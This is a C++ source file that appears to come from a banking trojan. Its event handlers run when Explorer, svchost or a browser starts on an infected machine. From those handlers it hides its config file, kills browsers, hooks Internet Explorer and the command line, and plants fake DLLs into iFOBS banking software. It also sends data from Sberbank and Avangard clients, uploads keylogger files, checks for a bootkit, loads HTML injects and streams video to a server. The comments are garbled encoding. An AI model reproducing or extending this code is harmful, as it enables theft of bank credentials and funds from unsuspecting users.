//---------------------------------------------------------------------------

#include "BotEvents.h"
#include "GetApi.h"
#include "Strings.h"
#include "Utils.h"
#include "Loader.h"
#include "Pipes.h"
#include "BotHosts.h"
#include "BotCore.h"
#include "StrConsts.h"

#include "Modules.h"

//---------------------------------------------------------------------------





//-----------------------------------------------------------
//  InitializeHiddenFiles - ������� �������������� ������
//                          ������ ����� ������� ��� �����
//                          �������
//-----------------------------------------------------------
void InitializeHiddenFiles()
{
	BOT::AddHiddenFile(GetStr(EStrConfigFileName));
	//BOT::AddHiddenFile(GetStr(EStrConfigHPFileName));
}

//---------------------------------------------------------------------------

//extern bool ExecuteLoadDLLDisk(LPVOID, PCHAR Command, PCHAR Args);
extern bool ExecuteDocFind(LPVOID, PCHAR Command, PCHAR Args);

void ExplorerFirstStart(PEventData Data)
{
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef antirapportH
		AntiRapport();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef AvangardH
		AvangardWeb::SendFolder_avn_ib();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef SBERH
		Sber::SendLogIfReestr();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef IFobsH
		IFobs::KillIFobs(0);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef FakeDllInstallerH
		RunThread( IFobs::InstallFakeDll,0 );
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//ExecuteDocFind( 0, 0, 0 );
	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
//	ExecuteRunRDP( 0, 0, 0 );
//	ExecuteVNC( 0, 0, "192.168.0.100" );
	// ������ ������ ���� � ����������

	// ��������� �������� �������
	/* //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef coocksolH
		StartDeleteCookiesThread();
    //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if */
}
//---------------------------------------------------------------------------


void ExplorerStart(PEventData Data)
{

	// ������ ���������� �������, ��������������� � ���������� ����
	BOT::TryCreateBotInstance();


	// �������������� ���������� �����
    InitializeHiddenFiles();


	// ���������� ������� �������� � ����.
	// ������ ������������ ������ ���� ���������� �������� ���
    BOT::SaveSettings(true, true, true);


	// ������� ��� ���������� ��������
	KillAllBrowsers();

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef FakeDllInstallerH
    	FDI::Execute();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef BBSCBankH
		CBank::Start();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef JAVS_PATCHERH
		StartThread(Run_Path, NULL);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// ������ ���������� WinInet
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef InternetExplorerH
		HookInternetExplorer();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// ��������� ������ ���������
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef KeepAliveH
		KeepAliveCheckProcess(PROCESS_SVCHOST);
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef VideoRecorderH
			//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef VideoProcessSvchost
				KeepAliveCheckProcess(PROCESS_VIDEO);
			//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if 
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if


	// ��������� ������� ���������
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef CyberPlatDLLH
		CyberPlatCheckInstalled(); 
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef CmdLineH
		HookCmdLine();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef BOTMONITOR
    	PIPE::CreateProcessPipe((PCHAR)BotMonitor::ProcessExplorer, true);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef BitcoinH
		BitcoinRunAfterReboot();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef VideoRecorderH
		VideoProcess::ConnectToServer( 0, true );
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// ������ ������ �������� ��������.
	// �����! ����� ������ ���������� � ��������� �������
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef StealthBrowserH
		HANDLE H = StartThread( RunIeSB/*SellExecute*/, NULL );// ��������� ����� ����������� �� ������ ��������
		pWaitForSingleObject(H, INFINITE);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

}
//---------------------------------------------------------------------------

void SVChostStart(PEventData Data, bool &Cancel)
{
	// �������� ������� ���������� � �������� svchost


	// ��������� �������������� �������� ������
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef HostsAutoUpdateH
		StartHostsUpdater();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef bootkitH
		IsBootkitInstaled();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if


	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef KeepAliveH
		// �������������� ������ ���������
		KeepAliveInitializeProcess(PROCESS_SVCHOST);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//�������� ����� �������� ��������� ������ ��� �������� ����������
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef KeyLoggerH	
		SendLoadedFiles();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		//������ ������� �� ������� , ��������� ��� � 15 ��� ���� �������� �������,�� ��������� ������� SB
		// �������������� ������� �������� �������� �� ��������
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef HunterH
		URLHunter::StartClient();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef BOTMONITOR
    	PIPE::CreateProcessPipe((PCHAR)BotMonitor::ProcessLoader, true);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
}
//---------------------------------------------------------------------------

void InternetExplorerStarted(PEventData Data)
{
	// ������� Internet Explorer. ��������� ����� ������� � ������� ��������

}
//---------------------------------------------------------------------------


void FireFoxStarted(PEventData Data)
{
	// ������� �������. ��������� ����� ������� � ������� ��������

}
//---------------------------------------------------------------------------

void BrowserStarted(PEventData Data)
{
	// ������� ��������� �������. ��������� ����� ������� � ������� ��������
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef HTMLSendH
		InitHTMLSendHandlers();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if;

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef AzConfigH
		AzInizializeHTMLInjects();
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

}
//---------------------------------------------------------------------------

void ApplicationStarted(PEventData Data)
{
	// �������� ����������� ����������

}
//---------------------------------------------------------------------------

